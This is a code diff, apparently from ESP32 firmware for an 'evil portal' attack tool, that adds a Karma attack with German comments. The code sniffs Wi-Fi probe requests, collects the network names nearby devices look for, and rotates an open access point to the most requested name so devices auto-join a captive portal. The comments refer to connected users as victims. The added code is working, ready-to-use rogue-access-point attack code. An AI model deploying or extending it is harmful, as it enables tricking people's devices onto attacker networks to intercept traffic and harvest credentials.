@@ -593,6 +593,195 @@ static void dns_task(void* arg) {
     vTaskDelete(NULL);
 }
 
+// ---------------------------------------------------------------------------
+// Karma: Probe-Requests sniffen waehrend die SoftAP laeuft, die meistgesuchten
+// SSIDs ernten und die AP-SSID dynamisch darauf umstellen, damit Geraete ihr
+// "bekanntes" (offenes) Netz sehen und automatisch auf das Captive-Portal
+// joinen. Reconfig nur wenn kein Client verbunden ist (Opfer nicht kicken).
+// ---------------------------------------------------------------------------
+
+#define KARMA_MAX_SSIDS 24
+#define KARMA_ROTATE_MS 6000   // Rotations-Intervall
+#define KARMA_STALE_MS 180000  // SSIDs aelter als 3 min ignorieren
+
+typedef struct {
+    char ssid[33];
+    uint16_t hits;
+    uint32_t last_ms;
+} KarmaEntry;
+
+static portMUX_TYPE s_karma_mux = portMUX_INITIALIZER_UNLOCKED;
+static KarmaEntry s_karma_tbl[KARMA_MAX_SSIDS];
+static volatile uint16_t s_karma_count = 0;
+static volatile bool s_karma_enabled = false;
+static volatile bool s_karma_run = false;
+static TaskHandle_t s_karma_task = NULL;
+static char s_karma_base_ssid[33] = {0}; // Original-SSID, nicht ueberschreiben
+static char s_karma_current[33] = {0};   // aktuell gespoofte SSID
+
+// Promiscuous-RX-Callback (WiFi-Task-Kontext): Probe-Requests parsen und die
+// gesuchte SSID in die Harvest-Tabelle aufnehmen.
+static void karma_promisc_cb(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if(type != WIFI_PKT_MGMT || !s_karma_enabled) return;
+    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
+    const uint8_t* fr = p->payload;
+    int len = p->rx_ctrl.sig_len;
+    if(len < 26) return;
+    // Frame Control: Type=Mgmt(0) Subtype=ProbeReq(4) -> Byte0 == 0x40.
+    if((fr[0] & 0xFC) != 0x40) return;
+    // Tagged params ab Offset 24, SSID = Element-ID 0.
+    if(fr[24] != 0) return;
+    uint8_t slen = fr[25];
+    if(slen == 0 || slen > 32) return; // Wildcard/Broadcast oder ungueltig
+    if(26 + slen > len) return;
+
+    char ssid[33];
+    memcpy(ssid, &fr[26], slen);
+    ssid[slen] = 0;
+    if(s_karma_base_ssid[0] && strcmp(ssid, s_karma_base_ssid) == 0) return;
+
+    uint32_t now = esp_log_timestamp();
+    portENTER_CRITICAL(&s_karma_mux);
+    int found = -1, weakest = 0;
+    for(int i = 0; i < (int)s_karma_count; i++) {
+        if(strcmp(s_karma_tbl[i].ssid, ssid) == 0) {
+            found = i;
+            break;
+        }
+        if(s_karma_tbl[i].hits < s_karma_tbl[weakest].hits) weakest = i;
+    }
+    if(found >= 0) {
+        if(s_karma_tbl[found].hits < 0xFFFF) s_karma_tbl[found].hits++;
+        s_karma_tbl[found].last_ms = now;
+    } else if(s_karma_count < KARMA_MAX_SSIDS) {
+        KarmaEntry* e = &s_karma_tbl[s_karma_count++];
+        strncpy(e->ssid, ssid, sizeof(e->ssid) - 1);
+        e->ssid[sizeof(e->ssid) - 1] = 0;
+        e->hits = 1;
+        e->last_ms = now;
+    } else {
+        // Tabelle voll: schwaechsten Eintrag verdraengen.
+        KarmaEntry* e = &s_karma_tbl[weakest];
+        strncpy(e->ssid, ssid, sizeof(e->ssid) - 1);
+        e->ssid[sizeof(e->ssid) - 1] = 0;
+        e->hits = 1;
+        e->last_ms = now;
+    }
+    portEXIT_CRITICAL(&s_karma_mux);
+}
+
+// Setzt die SoftAP-SSID neu (offen, gleicher Kanal). Laeuft im Karma-Task.
+static void karma_apply_ssid(const char* ssid) {
+    wifi_config_t ap_cfg = {0};
+    strncpy((char*)ap_cfg.ap.ssid, ssid, 32);
+    ap_cfg.ap.ssid_len = strlen(ssid);
+    ap_cfg.ap.channel = s_channel ? s_channel : 1;
+    ap_cfg.ap.authmode = WIFI_AUTH_OPEN;
+    ap_cfg.ap.max_connection = 4;
+    ap_cfg.ap.beacon_interval = 100;
+    esp_err_t err = esp_wifi_set_config(WIFI_IF_AP, &ap_cfg);
+    if(err == ESP_OK) {
+        strncpy(s_karma_current, ssid, sizeof(s_karma_current) - 1);
+        s_karma_current[sizeof(s_karma_current) - 1] = 0;
+        ESP_LOGI(TAG, "[karma] AP-SSID -> '%s'", ssid);
+    } else {
+        ESP_LOGW(TAG, "[karma] set_config: %s", esp_err_to_name(err));
+    }
+}
+
+static void karma_task(void* param) {
+    (void)param;
+    ESP_LOGI(TAG, "[karma] task start");
+    while(s_karma_run) {
+        for(int i = 0; i < KARMA_ROTATE_MS / 100 && s_karma_run; i++) {
+            vTaskDelay(pdMS_TO_TICKS(100));
+        }
+        if(!s_karma_run) break;
+        if(s_paused) continue;
+
+        // Kein SSID-Wechsel solange ein Opfer verbunden ist.
+        wifi_sta_list_t sl;
+        if(esp_wifi_ap_get_sta_list(&sl) == ESP_OK && sl.num > 0) continue;
+
+        uint32_t now = esp_log_timestamp();
+        char best[33] = {0};
+        uint16_t best_hits = 0;
+        portENTER_CRITICAL(&s_karma_mux);
+        for(int i = 0; i < (int)s_karma_count; i++) {
+            if(now - s_karma_tbl[i].last_ms > KARMA_STALE_MS) continue;
+            if(s_karma_tbl[i].hits > best_hits) {
+                best_hits = s_karma_tbl[i].hits;
+                strncpy(best, s_karma_tbl[i].ssid, sizeof(best) - 1);
+                best[sizeof(best) - 1] = 0;
+            }
+        }
+        portEXIT_CRITICAL(&s_karma_mux);
+
+        if(best[0] && strcmp(best, s_karma_current) != 0) {
+            karma_apply_ssid(best);
+        }
+    }
+    ESP_LOGI(TAG, "[karma] task stop");
+    s_karma_task = NULL;
+    vTaskDelete(NULL);
+}
+
+static void karma_start(const char* base_ssid) {
+    portENTER_CRITICAL(&s_karma_mux);
+    s_karma_count = 0;
+    portEXIT_CRITICAL(&s_karma_mux);
+    strncpy(s_karma_base_ssid, base_ssid ? base_ssid : "", sizeof(s_karma_base_ssid) - 1);
+    s_karma_base_ssid[sizeof(s_karma_base_ssid) - 1] = 0;
+    strncpy(s_karma_current, base_ssid ? base_ssid : "", sizeof(s_karma_current) - 1);
+    s_karma_current[sizeof(s_karma_current) - 1] = 0;
+
+    wifi_promiscuous_filter_t filt = {.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT};
+    esp_wifi_set_promiscuous_filter(&filt);
+    esp_wifi_set_promiscuous_rx_cb(karma_promisc_cb);
+    esp_err_t err = esp_wifi_set_promiscuous(true);
+    if(err != ESP_OK) {
+        ESP_LOGW(TAG, "[karma] set_promiscuous: %s", esp_err_to_name(err));
+        return;
+    }
+    s_karma_enabled = true;
+    s_karma_run = true;
+    if(xTaskCreate(karma_task, "EpKarma", 3072, NULL, 4, &s_karma_task) != pdPASS) {
+        ESP_LOGE(TAG, "[karma] task create FAILED");
+        s_karma_run = false;
+        s_karma_enabled = false;
+        esp_wifi_set_promiscuous(false);
+    }
+}
+
+static void karma_stop(void) {
+    if(!s_karma_enabled && !s_karma_task) return;
+    s_karma_run = false;
+    s_karma_enabled = false;
+    while(s_karma_task) vTaskDelay(pdMS_TO_TICKS(10));
+    esp_wifi_set_promiscuous(false);
+    esp_wifi_set_promiscuous_rx_cb(NULL);
+    portENTER_CRITICAL(&s_karma_mux);
+    s_karma_count = 0;
+    portEXIT_CRITICAL(&s_karma_mux);
+    s_karma_base_ssid[0] = 0;
+    s_karma_current[0] = 0;
+}
+
+uint16_t wlan_hal_evil_portal_karma_get_ssid_count(void) {
+    return s_karma_count;
+}
+
+bool wlan_hal_evil_portal_karma_get_current(char* out, size_t out_size) {
+    if(!out || out_size == 0) return false;
+    if(!s_karma_enabled || !s_karma_current[0]) {
+        out[0] = 0;
+        return false;
+    }
+    strncpy(out, s_karma_current, out_size - 1);
+    out[out_size - 1] = 0;
+    return true;
+}
+
 typedef struct {
     const WlanHalEvilPortalConfig* cfg;
     bool result;
@@ -759,6 +948,11 @@ static void evil_portal_start_worker(void* arg) {
         return;
     }
 
+    if(cfg->karma) {
+        ESP_LOGI(TAG, "[worker] enabling Karma");
+        karma_start(cfg->ssid);
+    }
+
     s_running = true;
     sa->result = true;
 
@@ -828,6 +1022,9 @@ static void evil_portal_stop_worker(void* arg) {
     ESP_LOGI(TAG, "[worker]   stopping DNS task");
     s_dns_run = false;
     while(s_dns_task) vTaskDelay(pdMS_TO_TICKS(10));
+
+    ESP_LOGI(TAG, "[worker]   stopping Karma");
+    karma_stop();
 
     ESP_LOGI(TAG, "[worker]   stopping HTTP server");
     stop_http();
